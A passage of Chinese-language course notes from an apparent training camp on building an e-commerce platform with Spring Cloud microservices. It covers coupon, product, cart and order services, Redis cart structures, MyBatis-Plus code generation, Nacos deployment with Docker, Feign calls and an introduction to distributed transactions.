  ```

   

- 事务隔离级别

  - 是指若干个并发的事务之间的隔离程度

  ```
  @Transactional(isolation = Isolation.READ_UNCOMMITTED) 读取未提交数据(会出现脏读, 不可重复读) 基本不使用
  
  @Transactional(isolation = Isolation.READ_COMMITTED) 读取已提交数据(会出现不可重复读和幻读)
  
  @Transactional(isolation = Isolation.REPEATABLE_READ) 可重复读(会出现幻读)
  
  @Transactional(isolation = Isolation.SERIALIZABLE) 串行化
  ```

  

- MYSQL: 默认为REPEATABLE_READ级别

* 备注：基础知识不牢固，一定要补（面试专题第一季，300~500道面试题）





















#### 第3集 优惠券微服务领劵接口-本地事务配置

**简介：领劵接口微服务本地事务配置**

* 领劵接口配置事务+测试
  * 启动类增加注解 @EnableTransactionManagement
  * 方法增加注解 @Transactional(rollbackFor=Exception.class,propagation=Propagation.REQUIRED)
  * 指定方法需要事务再添加，不能全局都使用



* 分布式锁测试锁续期的时候
  * 不能使用debug模式，不然看到不到自动续期





















#### 第4集 优惠券微服务领劵记录分页模块开发

**简介：微服务个人领券记录分页接口**

* 领劵记录查询开发

```
    @ApiOperation("分页查询我的优惠券列表")
    @GetMapping("page")
    public JsonData page(@RequestParam(value = "page",defaultValue = "1")int page,
                         @RequestParam(value = "size",defaultValue = "20")int size){

        Map<String,Object> pageInfo = couponRecordService.page(page,size);

        return JsonData.buildSuccess(pageInfo);
    }
    
    
     /**
     * 分页查询我的优惠券列表
     * @param page
     * @param size
     * @return
     */
    @Override
    public Map<String, Object> page(int page, int size) {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();

        //第1页，每页2条
        Page<CouponRecordDO> pageInfo = new Page<>(page, size);
        IPage<CouponRecordDO> recordDOPage = couponRecordMapper.selectPage(pageInfo, new QueryWrapper<CouponRecordDO>().eq("user_id",loginUser.getId()).orderByDesc("create_time"));
        Map<String, Object> pageMap = new HashMap<>(3);

        pageMap.put("total_record", recordDOPage.getTotal());
        pageMap.put("total_page", recordDOPage.getPages());
        pageMap.put("current_data", recordDOPage.getRecords().stream().map(obj -> beanProcess(obj)).collect(Collectors.toList()));

        return pageMap;
    }
```



















#### 第5集 优惠券微服务领劵记录详情接口开发

**简介：微服务个人领券记录详情接口**

* 领劵记录详情接口开发（防止水平权限攻击）

```
		/**
     * 查询优惠券记录信息
     * 水平权限攻击：也叫作访问控制攻击,Web应用程序接收到用户请求，修改某条数据时，没有判断数据的所属人，
     * 或者在判断数据所属人时从用户提交的表单参数中获取了userid。
     * 导致攻击者可以自行修改userid修改不属于自己的数据
     * @param recordId
     * @return
     */
    @ApiOperation("查询优惠券记录信息")
    @GetMapping("/detail/{record_id}")
    public JsonData findUserCouponRecordById(@PathVariable("record_id")long recordId ){

        CouponRecordVO couponRecordVO = couponRecordService.findById(recordId);
        return  couponRecordVO == null? JsonData.buildResult(BizCodeEnum.COUPON_NO_EXITS):JsonData.buildSuccess(couponRecordVO);
    }



    @Override
    public CouponRecordVO findById(long recordId) {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();
        CouponRecordDO recordDO = couponRecordMapper.selectOne(new QueryWrapper<CouponRecordDO>().eq("id", recordId).eq("user_id", loginUser.getId()));
        if(recordDO == null){return null;}

        CouponRecordVO couponRecordVO = beanProcess(recordDO);
        return couponRecordVO;
    }
```













**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十七章 架构师的思考+流量漏斗模型驱动解决方案





#### 第1集 优惠券拉新-发放新人劵流程思路设计和对比

**简介：优惠券拉新发放接口设计和思路**

* 用户注册->发放优惠券
  * RPC调用
    * 分布事务
  * 消息队列
    * 可靠性投递、幂等操作

* 说下两种方式的优缺点和选择
  * rpc实时性高，强一致性的场景下比消息队列优秀
  * 上下游系统处理能力存在差距的时候消息队列可以很好的缓冲
  * 引入消息队列，系统可用性降低，假如队列宕机则系统就不能正常运行
  * 引入消息队列，系统复杂性增加，考虑多方面的问题，比如一致性问题、如何保证消息不被重复消费，如何保证保证消息可靠传输等





























#### 第2集 一线大厂必备分析方法论-流量漏斗模型介绍 

**简介：流量漏斗模型-大厂里面必备的分析方法论**

* 什么是流量漏斗模型

  * 谁会用：公司产品经理、运营、公司CTO、CEO

  * 那我们研发工程师为啥要用？

  * 举个例子大家就明白

    * 互联网产品其本身就是一个虚拟的漏斗，用户的行为路径有很多，举个淘宝、JD这电商例子
    * 首页->查看商品->添加购物车->注册->登录->下单->支付->确认收货

    ![image-20210217120913332](img/image-20210217120913332.png)

    * 每一步都有折损，产品经理能安什么好心？

    ![image-20210217121241397](img/image-20210217121241397.png)

    * 就是找事给我们做，不断提高每一步的转换率，降低每步的折损
      * 调整布局、用户体验、缩短链路等
      * 不定期的短信邮箱推送提醒、标题党等
      * 拼团、优惠券、积分等等需求就是这样来的

    

    

    

    

    

    

    

    

    

    

    







#### 第3集 作为技术Leader的你-为什么要用流量漏斗模型 

**简介：作为技术Leader的你，为什么要用这个模型**



![image-20210217120913332](img/image-20210217120913332.png)



* 作为技术Leader的你，为什么要用？
  * 我们要有个做一个精益创业的思维 ”小步快跑，快速试错“
  * 把简单的事情想复杂，把复杂的事情做简单
  * 简历编写的时候，给些大厂的产品数据参考(非现象级爆款)
    * 日活1千万的用户，总用户量1~2亿，日新增5~10万
    * 日活1百万的用户，总用户量1~2千万，日新增1~2万
    * 日活5千，总用户量60~80万，日新增1k~3k之间

* 通过前面流量漏斗分析其实多数公司里面，注册的量级不高（排除大量买量和现象级爆款）

  * 直接使用rpc调用即可，不引入消息队列

    * 这里会涉及到分布式事务问题，思考，假如发放优惠券失败应该怎么办？
      * 两个微服务同时进行回滚？
      * 不给注册的账号登录了吗？
      * 你这样会丢掉工作的的，任何方式都不能一刀切，一定要思考下具体场景具体而定
    * 假如RPC方式调用-优惠券发放失败，记录日志就行，可以人工补发或者定时任务重发

    

  * 前期不用引入相关的微服务组件



















#### 第4集 新用户注册-发放拉新领劵接口开发

**简介：开发用户注册拉新领劵接口**

* 开发优惠券微服务-领劵接口controller

```

```

* service层开发

```

```





















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十八章 1024电商平台-商品购物车微服务介绍和项目创建



#### 第1集 1024电商平台-商品购物车微服务功能需求介绍

**简介：商品-购物车-微服务功能需求介绍**

* 电商里面的知识介绍

  * 类目
    * 一个树状结构的系统，根据业务可以分成4-5级。如手机->智能手机->国产手机 类目，在这里面，手机是一级类目，国产手机是三级类目，也是叶子类目
  * SPU
    * Standard Product Unit：标准化产品单元。是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。通俗点讲，属性值、特性相同的商品就可以称为一个SPU
    * 比如 Iphone100 就是一个SPU
  * SKU
    * 一般指库存保有单位。库存保有单位即库存进出计量的单位， 可以是以件、盒、托盘等为单位。*SKU*是物理上不可分割的最小存货单元，在服装、鞋类商品中使用最多最普遍，买家购买、商家进货、供应商备货、工厂生产都是依据SKU进行的
    * 比如Iphone100 128g 土豪金就是一个SKU

  ![image-20210218154342859](img/image-20210218154342859.png)

  * 1024电商平不做多类目SPU/SKU设计

    * 否则这个就多了好几百集内容了，且不通用

    * 大课训练营核心还是把多个技术知识点综合起来

    * 有兴趣的同学可以看我们《小滴课堂的电商供应链平台设计专题视频》

      ![image-20210218155138551](img/image-20210218155138551.png)

  

* 商品微服务介绍

  * 首页商品分页展示
  * 商品详情展示
  * 库存控制

  ![image-20210218151437589](../../../Documents/image-20210218151437589.png)

* 购物车功能介绍
  * 加入购物车
  * 清空购物车
  * 修改购物车数量

![image-20210218151604445](../../../Documents/image-20210218151604445.png)





















#### 第2集 1024电商平台-商品购物车项目核心知识和数据库建立

**简介：商品购物车项目核心知识和数据库建立**

* 商品和购物车微服务核心知识：

  * 商品微服务库存管理
  * 分布式事务知识
  * 电商平台购物车的实现方案
  * 通用购物车数据结构设计
  * 购物车价格统计业务逻辑梳理
  * 重点知识下沉到订单微服务
    * 商品库存锁定和回收
    * 优惠券使用锁定和回收
    * 订单验价
    * 多通道支付设计等

  ![image-20210218155207009](img/image-20210218155207009.png)

* 商品服务数据库建立

```
CREATE TABLE `banner` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `img` varchar(524) DEFAULT NULL COMMENT '图片',
  `url` varchar(524) DEFAULT NULL COMMENT '跳转地址',
  `weight` int(11) DEFAULT NULL COMMENT '权重',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4;

INSERT INTO `banner` (`id`, `img`, `url`, `weight`)
VALUES
	(1, 'https://file.xdclass.net/video/2020/alibabacloud/zx-lbt.jpeg', 'https://m.xdclass.net/#/member', 1),
	(2, 'https://file.xdclass.net/video/%E5%AE%98%E7%BD%91%E8%BD%AE%E6%92%AD%E5%9B%BE/20%E5%B9%B4%E5%8F%8C11%E9%98%BF%E9%87%8C%E4%BA%91/fc-lbt.jpeg', 'https://www.aliyun.com/1111/pintuan-share?ptCode=MTcwMTY3MzEyMjc5MDU2MHx8MTE0fDE%3D&userCode=r5saexap', 3),
	(3, 'https://file.xdclass.net/video/%E5%AE%98%E7%BD%91%E8%BD%AE%E6%92%AD%E5%9B%BE/20%E5%B9%B4%E5%8F%8C11%E9%98%BF%E9%87%8C%E4%BA%91/FAN-lbu-vip.jpeg', 'https://file.xdclass.net/video/%E5%AE%98%E7%BD%91%E8%BD%AE%E6%92%AD%E5%9B%BE/Nginx.jpeg', 2);



CREATE TABLE `product` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(128) DEFAULT NULL COMMENT '标题',
  `cover_img` varchar(128) DEFAULT NULL COMMENT '封面图',
  `detail` varchar(256) DEFAULT '' COMMENT '详情',
  `old_price` decimal(16,2) DEFAULT NULL COMMENT '老价格',
  `price` decimal(16,2) DEFAULT NULL COMMENT '新价格',
  `stock` int(11) DEFAULT NULL COMMENT '库存',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `lock_stock` int(11) DEFAULT '0' COMMENT '锁定库存',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4;


INSERT INTO `product` (`id`, `title`, `cover_img`, `detail`, `old_price`, `price`, `stock`, `create_time`, `lock_stock`)
VALUES
	(1, '小滴课堂抱枕', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', 'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg', 32.00, 213.00, 100, '2021-09-12 00:00:00', 31),
	(2, '技术人的杯子Linux', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', 'https://file.xdclass.net/video/2021/59-Postman/summary.jpeg', 432.00, 42.00, 20, '2021-03-12 00:00:00', 2),
	(3, '技术人的杯子docker', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', 'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg', 35.00, 12.00, 20, '2022-09-22 00:00:00', 13),
	(4, '技术人的杯子git', 'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png', 'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg', 12.00, 14.00, 20, '2022-11-12 00:00:00', 2);

```























#### 第3集 商品微服务+MybatisPlusGenerator代码自动生成工具

**简介：Mybatis-plus-generator代码自动化生成微服务相关类**

* 配置代码生成（标记TODO的记得修改）

```
public class MyBatisPlusGenerator {

    public static void main(String[] args) {
        //1. 全局配置
        GlobalConfig config = new GlobalConfig();

                // 作者
                config.setAuthor("二当家小D")
                // 生成路径，最好使用绝对路径，window路径是不一样的
                //TODO  TODO  TODO  TODO
                .setOutputDir("/Users/xdclass/Desktop/demo/src/main/java")
                // 文件覆盖
                .setFileOverride(true)
                // 主键策略
                .setIdType(IdType.AUTO)

                .setDateType(DateType.ONLY_DATE)
                // 设置生成的service接口的名字的首字母是否为I，默认Service是以I开头的
                .setServiceName("%sService")

                //实体类结尾名称
                .setEntityName("%sDO")

                //生成基本的resultMap
                .setBaseResultMap(true)

                //不使用AR模式
                .setActiveRecord(false)

                //生成基本的SQL片段
                .setBaseColumnList(true);

        //2. 数据源配置
        DataSourceConfig dsConfig = new DataSourceConfig();
        // 设置数据库类型
        dsConfig.setDbType(DbType.MYSQL)
                .setDriverName("com.mysql.cj.jdbc.Driver")
                //TODO  TODO  TODO  TODO
                .setUrl("jdbc:mysql://127.0.0.1:3306/xdclass_product?useSSL=false")
                .setUsername("root")
                .setPassword("xdclass.net");

        //3. 策略配置globalConfiguration中
        StrategyConfig stConfig = new StrategyConfig();

        //全局大写命名
        stConfig.setCapitalMode(true)
                // 数据库表映射到实体的命名策略
                .setNaming(NamingStrategy.underline_to_camel)

                //使用lombok
                .setEntityLombokModel(true)

                //使用restcontroller注解
                .setRestControllerStyle(true)

                // 生成的表, 支持多表一起生成，以数组形式填写
                //TODO  TODO  TODO  TODO
                .setInclude("banner","product");

        //4. 包名策略配置
        PackageConfig pkConfig = new PackageConfig();
        pkConfig.setParent("net.xdclass")
                .setMapper("mapper")
                .setService("service")
                .setController("controller")
                .setEntity("model")
                .setXml("mapper");

        //5. 整合配置
        AutoGenerator ag = new AutoGenerator();
        ag.setGlobalConfig(config)
                .setDataSource(dsConfig)
                .setStrategy(stConfig)
                .setPackageInfo(pkConfig);

        //6. 执行操作
        ag.execute();
        System.out.println("======= 小滴课堂 Done 相关代码生成完毕  ========");
    }
}
```



* 导入生成好的代码
  * model (为啥不放common项目，如果是确定每个服务都用到的依赖或者类才放到common项目)
  * mapper 类接口拷贝
  * resource/mapper文件夹 xml脚本拷贝
  * controller
  * service 不拷贝





















#### 第4集 商品微服务项目基本配置整合+轮播图列表接口开发

**简介：项目相关配置整合和轮播图接口开发**

* SpringBoot项目启动类和配置文件配置



* 轮播接口开发

```
@Service
public class BannerServiceImpl implements BannerService {

    @Autowired
    private BannerMapper bannerMapper;

    @Override
    public List<BannerVO> list() {
        List<BannerDO> list = bannerMapper.selectList(new QueryWrapper<BannerDO>().
                orderByAsc("weight"));

        List<BannerVO> bannerVOS  = list.stream().map(obj -> {
                    BannerVO vo = new BannerVO();
                    BeanUtils.copyProperties(obj, vo);
                    return vo;
                }
        ).collect(Collectors.toList());

        return bannerVOS;
    }

}
```

















#### 第5集 商品微服务-商品列表分页接口开发

**简介：商品首页分页列表接口开发**

* 分页列表接口controller开发 

* 分页列表接口service开发 



























#### 第6集 商品微服务-商品详情接口开发和拦截器配置

**简介：商品首页分页列表接口开发和拦截器配置**

* 商品详情接口controller开发 

* 商品详情接口service开发 

* 拦截器配置





















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十九章 1024电商平台-购物车数据结构设计+编码落地



#### 第1集 电商平台-常见购物车功能实现介绍

**简介：电商平台常见购物车 功能实现介绍**

* 购物车里面的购物项常见字段

  * user_id、product_id、buy_num

  ![image-20210218224622798](img/image-20210218224622798.png)

* 购物车常见实现方式

  * 实现方式一:存储到数据库

    * 性能存在瓶颈

    

  * 实现方式二:前端本地存储-localstorage-sessionstorage

    * localstorage在浏览器中存储 key/value 对，没有过期时间。
    * sessionstorage在浏览器中存储 key/value 对,在关闭会话窗口后将会删除这些数据。

    

  * 实现方式三:后端存储到缓存如redis

    * 可以开启AOF持久化防止重启丢失(推荐)

    

  * 实现方式四:后端存储到缓存如redis-并同步更新到数据库

    * 大家可能会想到缓存和数据库的一致性，加了用户唯一标识后，没高并发操作同一数据的场景















#### 第2集  1024电商平台-购物车和购物项VO类开发

**简介：购物车和购物项VO类开发**

* 一个购物车里面，存在多个购物项
* CartVO 购物车
  * 商品总件数
  * 整个购物车总价
  * 实际支付总价



* CartItemVO 购物项
  * 商品id
  * 购买数量
  * 商品标题（冗余）
  * 商品图片（冗余）
  * 商品单价
  * 总价格 ( 单价*数量 )

* CartVO 和 CartItemVO 编写























#### 第3集  1024电商平台-购物车redis数据结构讲解

**简介：购物车redis数据结构讲解**

* 购物车数据结构介绍
  * 一个购物车里面，存在多个购物项
  * 所以 购物车结构是一个双层Map：
    * Map<String,Map<String,String>>
    * 第一层Map，Key是用户id
    * 第二层Map，Key是购物车中商品id，值是购物车数据

* 对应redis里面的存储

  * redis里面有多种数据结构，应该使用哪种？
  * 答案是 hash结构

  ![image-20210221210955210](img/image-20210221210955210.png)















#### 第4集  商品微服务-添加购物车接口开发和方法抽取

**简介：添加购物车接口开发和方法抽取**

* 拦截器配置（添加商品到购物车需要登录）
* 添加购物车接口

```
@Override
    public void addToCart(CartItemRequest cartItemRequest) {

        Long productId = cartItemRequest.getProductId();

        int buyNum = cartItemRequest.getBuyNum();
        //获取购物车
        BoundHashOperations<String, Object, Object> myCart = getMyCartOps();

        Object cacheObj = myCart.get(productId);
        String result = "";

        if (cacheObj != null) {
            result = (String) cacheObj;
        }
        if (StringUtils.isBlank(result)) {
            //不存在则新建一个购物项
            CartItemVO cartItem = new CartItemVO();
            ProductVO productVO = productService.findDetailById(productId);
            cartItem.setAmount(productVO.getAmount());
            cartItem.setBuyNum(buyNum);
            cartItem.setProductId(productId);
            cartItem.setProductImg(productVO.getCoverImg());
            cartItem.setProductTitle(productVO.getTitle());
            myCart.put(productId, JSON.toJSONString(cartItem));
        } else {
            //存在则新增数量
            CartItemVO cartItem = JSON.parseObject(result, CartItemVO.class);
            cartItem.setBuyNum(cartItem.getBuyNum() + buyNum);
            myCart.put(productId, JSON.toJSONString(cartItem));
        }

    }
```

* 购物车方法抽取

```
    /**
     * 抽取我的购物车通用方法
     *
     * @return
     */
    private BoundHashOperations<String, Object, Object> getMyCartOps() {
        String cartKey = getCartKey();
        return redisTemplate.boundHashOps(cartKey);
    }


    /**
     * 获取购物车的key
     *
     * @return
     */
    private String getCartKey() {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();
        String cartKey = String.format(CacheKey.CART_KEY, loginUser.getId());
        return cartKey;
    }
```

* 注意：字段修改，统一使用 amount, 不使用price















#### 第5集 购物车功能开发-redis乱码问题和清空购物车接口开发

**简介：redis乱码问题和清空购物车接口开发**

* redis存储乱码问题
  * 默认使用JdkSerializationRedisSerializer进行序列化
  * 修改key-value序列化方式，hash结构不修改
* 清空购物车接口开发































#### 第6集 购物车功能开发-查看我的购物车接口

**简介：查看我的购物车接口开发**

* 查看我的购物车接口开发

* 抽取方法-需要支持查询商品最新价格























#### 第7集 购物车功能开发-删除和修改购物项接口

**简介：购物车-删除购物项和修改购物车数量接口开发**

* 删除购物项接口开发
* 修改购物车商品数量接口开发

























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十章 1024电商平台-订单微服务开发



#### 第1集 1024电商平台-订单微服务功能需求介绍

**简介：订单微服务功能需求介绍**

* 核心接口-下单
* 订单微服务涉及的功能知识点
  * 创建订单和防重提交
  * 多个微服务之间通讯-分布式事务选择
  * 商品库存锁定和回收
  * 优惠券使用锁定和回收
  * 支付宝支付对接
  * 优惠券+商品订单验价
  * 多通道支付和设计整合



















#### 第2集 1024电商平台-订单微服务数据库表讲解

**简介：订单微服务数据库表讲解**

* 简单关系图（非ER图）

![image-20210221230413131](../../../Library/Application Support/typora-user-images/image-20210221230413131.png)

* 订单表

```
CREATE TABLE `product_order` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `out_trade_no` varchar(64) DEFAULT NULL COMMENT '订单唯一标识',
  `state` varchar(11) DEFAULT NULL COMMENT 'NEW 未支付订单,PAY已经支付订单,CANCEL超时取消订单',
  `create_time` datetime DEFAULT NULL COMMENT '订单生成时间',
  `total_amount` decimal(16,2) DEFAULT NULL COMMENT '订单总金额',
  `pay_amount` decimal(16,2) DEFAULT NULL COMMENT '订单实际支付价格',
  `pay_type` varchar(64) DEFAULT NULL COMMENT '支付类型，微信-银行-支付宝',
  `nickname` varchar(64) DEFAULT NULL COMMENT '昵称',
  `head_img` varchar(524) DEFAULT NULL COMMENT '头像',
  `user_id` int(11) DEFAULT NULL COMMENT '用户id',
  `del` int(5) DEFAULT '0' COMMENT '0表示未删除，1表示已经删除',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `order_type` varchar(32) DEFAULT NULL COMMENT '订单类型 DAILY普通单，PROMOTION促销订单',
  `receiver_address` varchar(1024) DEFAULT NULL COMMENT '收货地址 json存储',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2439 DEFAULT CHARSET=utf8mb4;
```



* 订单项表

```
CREATE TABLE `product_order_item` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
  `product_order_id` bigint(11) DEFAULT NULL COMMENT '订单号',
  `out_trade_no` varchar(32) DEFAULT NULL,
  `product_id` bigint(11) DEFAULT NULL COMMENT '产品id',
  `product_name` varchar(128) DEFAULT NULL COMMENT '商品名称',
  `product_img` varchar(524) DEFAULT NULL COMMENT '商品图片',
  `buy_num` int(11) DEFAULT NULL COMMENT '购买数量',
  `create_time` datetime DEFAULT NULL,
  `total_amount` decimal(16,2) DEFAULT NULL COMMENT '购物项商品总价格',
  `amount` decimal(16,0) DEFAULT NULL COMMENT '购物项商品单价',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=194 DEFAULT CHARSET=utf8mb4;
```





















#### 第3集 订单微服务+MybatisPlusGenerator代码自动生成工具

**简介：Mybatis-plus-generator代码自动化生成微服务相关类**

* 配置代码生成（标记TODO的记得修改）

```
public class MyBatisPlusGenerator {

    public static void main(String[] args) {
        //1. 全局配置
        GlobalConfig config = new GlobalConfig();

                // 作者
                config.setAuthor("二当家小D")
                // 生成路径，最好使用绝对路径，window路径是不一样的
                //TODO  TODO  TODO  TODO
                .setOutputDir("/Users/xdclass/Desktop/demo/src/main/java")
                // 文件覆盖
                .setFileOverride(true)
                // 主键策略
                .setIdType(IdType.AUTO)

                .setDateType(DateType.ONLY_DATE)
                // 设置生成的service接口的名字的首字母是否为I，默认Service是以I开头的
                .setServiceName("%sService")

                //实体类结尾名称
                .setEntityName("%sDO")

                //生成基本的resultMap
                .setBaseResultMap(true)

                //不使用AR模式
                .setActiveRecord(false)

                //生成基本的SQL片段
                .setBaseColumnList(true);

        //2. 数据源配置
        DataSourceConfig dsConfig = new DataSourceConfig();
        // 设置数据库类型
        dsConfig.setDbType(DbType.MYSQL)
                .setDriverName("com.mysql.cj.jdbc.Driver")
                //TODO  TODO  TODO  TODO
                .setUrl("jdbc:mysql://127.0.0.1:3306/xdclass_order?useSSL=false")
                .setUsername("root")
                .setPassword("xdclass.net");

        //3. 策略配置globalConfiguration中
        StrategyConfig stConfig = new StrategyConfig();

        //全局大写命名
        stConfig.setCapitalMode(true)
                // 数据库表映射到实体的命名策略
                .setNaming(NamingStrategy.underline_to_camel)

                //使用lombok
                .setEntityLombokModel(true)

                //使用restcontroller注解
                .setRestControllerStyle(true)

                // 生成的表, 支持多表一起生成，以数组形式填写
                //TODO  TODO  TODO  TODO
                .setInclude("product_order","product_order_item");

        //4. 包名策略配置
        PackageConfig pkConfig = new PackageConfig();
        pkConfig.setParent("net.xdclass")
                .setMapper("mapper")
                .setService("service")
                .setController("controller")
                .setEntity("model")
                .setXml("mapper");

        //5. 整合配置
        AutoGenerator ag = new AutoGenerator();
        ag.setGlobalConfig(config)
                .setDataSource(dsConfig)
                .setStrategy(stConfig)
                .setPackageInfo(pkConfig);

        //6. 执行操作
        ag.execute();
        System.out.println("======= 小滴课堂 Done 相关代码生成完毕  ========");
    }
}
```



* 导入生成好的代码
  * model (为啥不放common项目，如果是确定每个服务都用到的依赖或者类才放到common项目)
  * mapper 类接口拷贝
  * resource/mapper文件夹 xml脚本拷贝
  * controller
  * service 不拷贝

















#### 第4集 订单微服务项目基本配置整合-拦截器-枚举类配置

**简介：项目相关配置整合和拦截器配置**

* SpringBoot项目启动类和配置文件配置



* 拦截器配置



* 枚举类配置

```
/**
 * 客户端枚举类
 */
public enum ClientType {

    /**
     * 原生应用
     */
    APP,

    /**
     * 电脑端
     */
    PC,

    /**
     * 网页
     */
    H5
}


public enum ProductOrderPayTypeEnum {

    /**
     * 微信支付
     */
    WECHAT,

    /**
     * 支付支付
     */
    ALIPAY,

    /**
     * 银行卡支付
     */
    BANK;

}

public enum ProductOrderStateEnum {

    /**
     * 未支付订单
     */
    NEW,


    /**
     * 已经支付订单
     */
    PAY,

    /**
     * 超时取消订单
     */
    CANCEL;

}

public enum ProductOrderTypeEnum {

    /**
     * 普通订单
     */
    DAILY,


    /**
     * 促销订单
     */
    PROMOTION;

}
```





















#### 第5集 订单微服务-创建订单接口介绍-request类

**简介：订单微服务-创建订单接口介绍和request类型编写**

* 下单逻辑
  * 二步：创建订单-》调用支付（京东）
  * 一步：创建订单并调用支付（手淘）
* 创建订单
  * controller编写











#### 第6集 订单微服务-创建订单service伪代码编写

**简介：订单微服务-创建订单伪代码编写**

* service编写伪代码
  * 防重提交
  * 用户微服务-确认收货地址
  * 商品微服务-获取最新购物项和价格
  * 订单验价
    * 优惠券微服务-获取优惠券
    * 验证价格
  * 锁定优惠券
  * 锁定商品库存
  * 创建订单对象
  * 创建子订单对象
  * 发送延迟消息-用于自动关单
  * 创建支付信息-对接三方支付





















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十一章 微服务注册中心Nacos和feign远程调用开发



#### 第1集 微服务注册中心Docker容器化部署Nacos

**简介：注册中心Docker容器化部署Nacos**

- docker拉取镜像

```
docker pull nacos/nacos-server
```

- 查看镜像

```
docker images
```

- 启动Nacos

```
docker run --env MODE=standalone --name xdclass-nacos -d -p 8848:8848  nacos/nacos-server

//查看日志
docker logs -f 
```

- 访问Nacos（记得开放阿里云的网络安全组）

```
http://公网ip:8848/nacos

# 登录密码默认nacos/nacos
```















#### 第2集 微服务Nacos注册中心配置Mysql持久化

**简介：Nacos注册中心配置mysql持久化**

* nacos数据库脚本

  * 导入数据库脚本（本章本集资料里面）
  * 新增一个用户 nacos/nacos

  ```
  INSERT INTO `users` (`username`, `password`, `enabled`)
  VALUES
  	('nacos', '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu', 1);
  ```

  

* mysql最好使用5.7版本（业界用的比较多，稳定）

* 启动命令

```
docker run -d \
-e MODE=standalone \
-e SPRING_DATASOURCE_PLATFORM=mysql \
-e MYSQL_SERVICE_HOST=192.168.0.104 \
-e MYSQL_SERVICE_PORT=3306 \
-e MYSQL_SERVICE_USER=root \
-e MYSQL_SERVICE_PASSWORD=xdclass.net \
-e MYSQL_SERVICE_DB_NAME=xdclass_nacos \
-p 8848:8848 \
--restart=always \
--name nacos \
nacos/nacos-server 
```

* 访问（大家改成自己的ip）
  * http://192.168.0.104:8848/nacos



















#### 第3集 多个微服务服务引入Nacos注册中心和Feign依赖

**简介：微服务引入Nacos注册中心和Feign远程调用**

* common项目添加依赖

```
       <!--添加nacos客户端-->
       <dependency>
           <groupId>com.alibaba.cloud</groupId>
           <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>
       </dependency>
       <!--Feign远程调用-->
       <dependency>
           <groupId>org.springframework.cloud</groupId>
           <artifactId>spring-cloud-starter-openfeign</artifactId>
       </dependency>
```

* 用户和优惠券微服务配置注册中心

```
  cloud:
    #注册中心地址
    nacos:
      discovery:
        server-addr: 112.74.55.160:8848
```

* 用户和优惠券微服务启动类添加

```
@EnableFeignClients
@EnableDiscoveryClient
```



* 订单和商品微服务配置注册中心

```
  cloud:
    #注册中心地址
    nacos:
      discovery:
        server-addr: 112.74.55.160:8848
```

* 订单和商品微服务启动类添加

```
@EnableFeignClients
@EnableDiscoveryClient
```

















#### 第4集 拉新业务-用户微服务和优惠券微服务之间的通讯

**简介：拉新业务，用户微服务和优惠券微服务之间的通讯**

* 用户微服务调用优惠券微服务开发

```
@FeignClient(name = "xdclass-coupon-service")
public interface CouponFeignService {

    /**
     * 新用户注册发放优惠券
     * @param newUserCouponRequest
     * @return
     */
    @PostMapping("/api/coupon/v1/new_user_coupon")
    JsonData addNewUserCoupon(@RequestBody NewUserCouponRequest newUserCouponRequest);
}
```

















#### 第5集 大课训练营里面的小结和思考建议

**简介：大课训练营的小结和思考建议**

* 大课里面的小结

  * 代码编写不少，有些小bug或者优化点，大家可以细心发现，群里讨论	

    

  * 比如分布式事务、分布式锁、业务逻辑等，多思考下

![image-20210223172814523](img/image-20210223172814523.png)



















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十二章  微服务核心知识之分布式事务的那些事情





#### 第1集  关于分布式事务的由来你知识多少

**简介：分布式事务介绍和产生原因**

* 什么是分布式事务

  * 事务

  ```
  事务指的就是一个操作单元，在这个操作单元中的所有操作最终要保持一致的行为，要么所有操作都成功，要么所有的操作都被撤销
  
  分两种：
  一个是本地事务：本地事物其实可以认为是数据库提供的事务机
  一个是分布式事务
  ```

  * 分布式事务

  ```
  指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。
  
  简单的说，就是一次大的操作由不同的小操作组成，这些小的操作分布在不同的服务器上，且属于不同的应用
  
  分布式事务需要保证这些小操作要么全部成功，要么全部失败。
  
  本质上来说，分布式事务就是为了保证不同数据库的数据一致性
  ```

  

* 产生的原因

  * 业务发展，数据库的拆分-分库分表
  * SOA和微服务架构的使用
  * 多个微服务之间调用异常
    * 网络异常、请求超时、数据库异常、程序宕机等

* 为啥说是核心知识呢，基本是每个微服务架构项目都离不开的难题

